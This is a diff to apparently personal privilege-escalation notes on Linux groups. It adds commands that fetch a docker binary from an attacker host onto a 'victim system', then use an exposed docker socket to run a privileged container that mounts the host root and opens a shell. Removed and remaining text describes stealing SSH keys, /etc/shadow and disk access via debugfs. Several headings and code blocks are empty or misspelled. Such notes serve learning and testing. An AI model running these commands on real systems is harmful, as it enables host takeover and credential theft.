@@ -41,7 +41,38 @@ uid=0(root) gid=0(root)
 ~ #
 ```
 # Docker
-Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command docker run -v /root:/mnt -it ubuntu. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.
+## Docker Shared Directories
+
+## Docker Sockets
+Find a dcoker socket in the system
+```
+srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
+```
+Installing docker in the victim system ([docker](https://master.dockerproject.com/linux/x86_64/docker))
+```
+wget https://<parrot-os>:443/docker -O docker
+chmod +x docker
+
+/tmp/docker -H unix:///app/docker.sock ps
+```
+Configuration of the docker with the socket
+```
+/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+/tmp/docker -H unix:///app/docker.sock ps
+/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
+```
+## Docker Group
+Using coker images in the system
+```
+docker image ls
+```
+
+# Docker Socket
+
+
+```
+
+```
 
 # Disk
 Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.
